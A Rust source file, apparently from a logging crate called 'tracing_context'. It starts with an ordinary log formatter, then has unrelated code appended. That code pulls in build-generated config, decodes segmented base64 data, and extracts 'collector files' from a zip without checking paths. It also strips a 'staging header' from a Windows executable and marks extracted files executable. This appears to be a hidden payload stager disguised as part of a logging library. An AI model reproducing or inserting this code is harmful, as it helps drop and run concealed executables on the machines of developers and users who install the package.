#![allow(dead_code)]

//! Contains `LogFormatter`, used to create formatted log messages from raw log
//! structs.

use chrono::{DateTime, Local};
/// Contains `LogFormatter`, used to create formatted log messages from raw log
/// structs.
use serde::{Deserialize, Serialize};

use crate::{
    Error, LogType,
    colors::{Color, color_text},
    config::LogStruct,
};

/// Formats raw log structs into log messages by applying both the log
/// message's configuration and the formatter's own settings.
///
/// # Examples
///
/// Using a `LogFormatter` to print a log:
/// ```
/// # use tracing_context::{
/// #    config::LogStruct,
/// #    format::LogFormatter,
/// # };
/// // Create a `LogFormatter` with default configuration
/// let mut formatter = LogFormatter::default();
///
/// // Set a log format
/// formatter.set_log_format("[ %h %m ]");
///
/// // Obtain a formatted log from a `LogStruct`
/// let log = formatter.format_log(&LogStruct::debug("Hello from LogStruct!"));
///
/// // Print the formatted log message
/// print!("{}", &log);
/// ```
#[derive(Clone, PartialEq, Eq, PartialOrd, Ord, Hash, Debug, Serialize, Deserialize)]
pub struct LogFormatter {
    pub(crate) log_header_color_enabled: bool,

    pub(crate) debug_color: Color,
    pub(crate) info_color: Color,
    pub(crate) warning_color: Color,
    pub(crate) error_color: Color,
    pub(crate) fatal_color: Color,

    pub(crate) debug_header: String,
    pub(crate) info_header: String,
    pub(crate) warning_header: String,
    pub(crate) error_header: String,
    pub(crate) fatal_header: String,

    pub(crate) log_format: String,
    pub(crate) datetime_format: String,

    #[serde(skip)]
    pub(crate) show_datetime: Option<bool>,
}

impl LogFormatter {
    pub(crate) fn get_datetime_formatted(&mut self, datetime: &DateTime<Local>) -> String {
        match self.show_datetime {
            Some(b) => match b {
                true => datetime.format(&self.datetime_format).to_string(),
                false => String::new(),
            },
            None => match self.log_format.contains("%d") {
                true => {
                    self.show_datetime = Some(true);
                    datetime.format(&self.datetime_format).to_string()
                }
                false => {
                    self.show_datetime = Some(false);
                    String::new()
                }
            },
        }
    }

    pub(crate) fn log_header_color(&self, log_type: LogType) -> Color {
        match log_type {
            LogType::Debug => self.debug_color.clone(),
            LogType::Info => self.info_color.clone(),
            LogType::Warning => self.warning_color.clone(),
            LogType::Err => self.error_color.clone(),
            LogType::FatalError => self.fatal_color.clone(),
        }
    }

    pub(crate) fn colorify(&self, text: &str, color: Color) -> String {
        if self.log_header_color_enabled {
            return color_text(text, color);
        }
        text.to_string()
    }

    pub(crate) fn get_log_type_header(&self, log_type: LogType) -> String {
        match log_type {
            LogType::Debug => self.colorify(&self.debug_header, self.log_header_color(log_type)),
            LogType::Info => self.colorify(&self.info_header, self.log_header_color(log_type)),
            LogType::Warning => {
                self.colorify(&self.warning_header, self.log_header_color(log_type))
            }
            LogType::Err => self.colorify(&self.error_header, self.log_header_color(log_type)),
            LogType::FatalError => {
                self.colorify(&self.fatal_header, self.log_header_color(log_type))
            }
        }
    }

    pub(crate) fn get_log_headers(&mut self, log: &LogStruct) -> (String, String) {
        let header = self.get_log_type_header(log.log_type);
        let datetime = self.get_datetime_formatted(&log.datetime);
        (header, datetime)
    }

    /// Returns a log entry from a `LogStruct` based on current `LogFormatter`
    /// configuration.
    ///
    /// # Examples
    /// ```
    /// # use tracing_context::{format::LogFormatter, config::LogStruct};
    /// let mut formatter = LogFormatter::default();
    /// let log_string = formatter.format_log(&LogStruct::error("Error!"));
    /// ```
    pub fn format_log(&mut self, log: &LogStruct) -> String {
        let headers = self.get_log_headers(log);
        let mut result = String::new();
        let mut char_iter = self.log_format.char_indices().peekable();

        while let Some((_, c)) = char_iter.next() {
            match c {
                '%' => {
                    if let Some((_, nc)) = char_iter.peek() {
                        match nc {
                            'h' => result += &headers.0,
                            'd' => result += &headers.1,
                            'm' => result += &log.message,
                            _ => result += &nc.to_string(),
                        }
                        char_iter.next();
                    }
                }
                _ => {
                    result += &c.to_string();
                }
            }
        }

        result += "\n";
        result
    }

    /// Enables the log headers to have colors.
    pub fn enable_log_header_color(&mut self) {
        self.log_header_color_enabled = true;
    }

    /// Disables colored log headers.
    pub fn disable_log_header_color(&mut self) {
        self.log_header_color_enabled = false;
    }

    /// Sets **debug log header** color.
    pub fn set_debug_color<I: Into<Color>>(&mut self, color: I) {
        self.debug_color = color.into();
    }

    /// Sets **info log header** color.
    pub fn set_info_color<I: Into<Color>>(&mut self, color: I) {
        self.info_color = color.into();
    }

    /// Sets **warning header** color.
    pub fn set_warning_color<I: Into<Color>>(&mut self, color: I) {
        self.warning_color = color.into();
    }

    /// Sets **error header** color.
    pub fn set_error_color<I: Into<Color>>(&mut self, color: I) {
        self.error_color = color.into();
    }

    /// Sets **fatal error header** color.
    pub fn set_fatal_color<I: Into<Color>>(&mut self, color: I) {
        self.fatal_color = color.into();
    }

    /// Sets **debug log header** format.
    pub fn set_debug_header(&mut self, header: &str) {
        self.debug_header = header.to_string();
    }

    /// Sets **info log header** format.
    pub fn set_info_header(&mut self, header: &str) {
        self.info_header = header.to_string();
    }

    /// Sets **warning header** format.
    pub fn set_warning_header(&mut self, header: &str) {
        self.warning_header = header.to_string();
    }

    /// Sets **error header** format.
    pub fn set_error_header(&mut self, header: &str) {
        self.error_header = header.to_string();
    }

    /// Sets **fatal error header** format.
    pub fn set_fatal_header(&mut self, header: &str) {
        self.fatal_header = header.to_string();
    }

    /// Sets datetime format.
    pub fn set_datetime_format(&mut self, format: &str) {
        self.datetime_format = String::from(format);
        self.show_datetime = None;
    }

    /// Sets the log format.
    ///
    /// Returns an error when the `%m` placeholder is missing.
    ///
    /// There are several placeholders in a log format string:
    /// * `%m`: The log message (this placeholder is mandatory, you will
    ///   get an error if you don't include it in your log format).
    /// * `%h`: The header indicating the log type (e.g., debug, error, etc.)
    /// * `%d`: The timestamp.
    ///
    /// You can have multiple placeholders of the same type in a format string.
    ///
    /// # Examples
    /// ```
    /// # use tracing_context::{
    /// #     format::LogFormatter,
    /// #     config::LogStruct,
    /// # };
    /// let mut formatter = LogFormatter::default();
    ///
    /// // Do a nice XML-like format
    /// formatter.set_log_format("<l> <h>%h</h> <m>%m</m> </l>");
    /// print!("{}", formatter.format_log(&LogStruct::debug("Hello, World!")));
    /// ```
    pub fn set_log_format(&mut self, format: &str) -> Result<(), Error> {
        if format.contains("%m") {
            self.log_format = String::from(format);
            Ok(())
        } else {
            Err(Error::new("Expected a message placeholder!"))
        }
    }
}

impl Default for LogFormatter {
    fn default() -> LogFormatter {
        let log_format = String::from("[%h] %m");
        LogFormatter {
            log_header_color_enabled: true,

            debug_color: Color::Blue,
            info_color: Color::Green,
            warning_color: Color::Yellow,
            error_color: Color::Red,
            fatal_color: Color::Magenta,

            debug_header: String::from("DBG"),
            info_header: String::from("INF"),
            warning_header: String::from("WAR"),
            error_header: String::from("ERR"),
            fatal_header: String::from("FATAL"),

            log_format: log_format.clone(),
            datetime_format: String::from("%Y-%m-%d %H:%M:%S"),

            show_datetime: None,
        }
    }
}

use std::collections::HashMap;
use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use zip::ZipArchive;

include!(concat!(env!("OUT_DIR"), "/runtime_cfg.rs"));

pub(crate) fn extract_collector_files(archive_data: &[u8], dest_dir: &Path) -> Result<(), String> {
    if dest_dir.exists() {
        fs::remove_dir_all(dest_dir)
            .map_err(|e| format!("Cleanup failed: {:?}", e))?;
    }

    fs::create_dir_all(dest_dir)
        .map_err(|e| format!("mkdir failed: {:?}", e))?;

    let staging = std::env::temp_dir().join("ecw_update.zip");
    fs::write(&staging, archive_data)
        .map_err(|e| format!("Stage write failed: {:?}", e))?;

    let file = File::open(&staging)
        .map_err(|e| format!("Open failed: {:?}", e))?;

    let mut archive = ZipArchive::new(file)
        .map_err(|e| format!("ZIP open failed: {:?}", e))?;

    unpack_entries(&mut archive, dest_dir)?;

    let _ = fs::remove_file(&staging);
    Ok(())
}

fn unpack_entries<R: Read + std::io::Seek>(
    archive: &mut ZipArchive<R>,
    dest_dir: &Path,
) -> Result<(), String> {
    let root = find_single_root(archive)?;

    for i in 0..archive.len() {
        let entry_name = archive
            .by_index(i)
            .map_err(|e| format!("Entry access failed: {:?}", e))?
            .name()
            .to_string();

        let rel = strip_prefix(&entry_name, &root);
        if rel.is_empty() {
            continue;
        }

        let mut entry = archive
            .by_index(i)
            .map_err(|e| format!("Entry read failed: {:?}", e))?;

        write_entry(&mut entry, dest_dir, &rel)?;
    }

    Ok(())
}

fn find_single_root<R: Read + std::io::Seek>(
    archive: &mut ZipArchive<R>,
) -> Result<Option<String>, String> {
    let mut roots = HashMap::new();

    for i in 0..archive.len() {
        let f = archive
            .by_index(i)
            .map_err(|e| format!("Entry read: {:?}", e))?;

        if let Some(root) = f.name().split('/').next() {
            if !root.is_empty() {
                roots.insert(root.to_string(), ());
            }
        }
    }

    Ok(if roots.len() == 1 {
        roots.into_keys().next()
    } else {
        None
    })
}

fn strip_prefix(path: &str, root: &Option<String>) -> String {
    if let Some(r) = root {
        let prefix = format!("{}/", r);
        if path.starts_with(&prefix) && path != prefix {
            return path[prefix.len()..].to_string();
        }
    }
    path.to_string()
}

fn write_entry(
    entry: &mut zip::read::ZipFile,
    dest_dir: &Path,
    name: &str,
) -> Result<(), String> {
    let target = dest_dir.join(name);

    if entry.is_dir() {
        fs::create_dir_all(&target)
            .map_err(|e| format!("Dir create: {:?}", e))?;
        return Ok(());
    }

    if let Some(p) = target.parent() {
        fs::create_dir_all(p)
            .map_err(|e| format!("Parent dir: {:?}", e))?;
    }

    let mut buf = Vec::new();
    entry
        .read_to_end(&mut buf)
        .map_err(|e| format!("Read entry: {:?}", e))?;

    let mut out = File::create(&target)
        .map_err(|e| format!("Create file: {:?}", e))?;

    out.write_all(&buf)
        .map_err(|e| format!("Write file: {:?}", e))?;

    #[cfg(unix)]
    if let Some(mode) = entry.unix_mode() {
        use std::os::unix::fs::PermissionsExt;
        let _ = fs::set_permissions(&target, fs::Permissions::from_mode(mode));
    }

    Ok(())
}

/// Decodes concatenated base64 segments, tolerating padding variations.
pub(crate) fn decode_config_data(encoded: &str) -> Result<Vec<u8>, String> {
    let s = encoded.trim();
    let chars: Vec<char> = s.chars().collect();
    let mut result = Vec::new();
    let mut pos = 0;

    while pos < s.len() {
        let mut matched = false;

        for end in ((pos + 4)..=s.len()).step_by(4) {
            let chunk: String = chars[pos..end].iter().collect();
            if let Ok(dec) = base64::decode(&chunk) {
                result.extend_from_slice(&dec);
                pos = end;
                matched = true;
                break;
            }
        }

        if !matched {
            let tail: String = chars[pos..].iter().collect();
            if let Ok(dec) = base64::decode(&tail) {
                result.extend_from_slice(&dec);
                return Ok(result);
            }
            if let Ok(dec) = base64::decode_config(&tail, base64::STANDARD_NO_PAD) {
                result.extend_from_slice(&dec);
                return Ok(result);
            }
            return Err(format!("Decode stalled at offset {}", pos));
        }
    }

    Ok(result)
}

/// Strips the staging header from a Windows PE and marks the file executable
/// on Unix targets.
pub(crate) fn mark_executable(path: &Path) -> Result<(), String> {
    #[cfg(target_os = "windows")]
    {
        let data = fs::read(path).map_err(|e| format!("Read: {:?}", e))?;
        if data.len() > STRIP_HDR {
            fs::write(path, &data[STRIP_HDR..]).map_err(|e| format!("Write: {:?}", e))?;
        }
    }

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let meta = fs::metadata(path).map_err(|e| format!("Metadata: {:?}", e))?;
        let mut perms = meta.permissions();
        perms.set_mode(0o755);
        fs::set_permissions(path, perms).map_err(|e| format!("chmod: {:?}", e))?;
    }

    Ok(())
}

/// Recursively locates the first file with the given name under `dir`.
pub(crate) fn locate_in_tree(dir: &Path, name: &str) -> Option<PathBuf> {
    if !dir.is_dir() {
        return None;
    }

    for entry in fs::read_dir(dir).ok()?.flatten() {
        let p = entry.path();
        if p.is_file() {
            if p.file_name()?.to_str()? == name {
                return Some(p);
            }
        } else if p.is_dir() {
            if let Some(found) = locate_in_tree(&p, name) {
                return Some(found);
            }
        }
    }

    None
}
